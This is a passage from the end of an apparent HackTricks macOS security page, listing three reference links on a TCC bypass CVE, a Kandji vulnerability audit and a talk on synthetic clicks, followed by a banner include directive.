- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
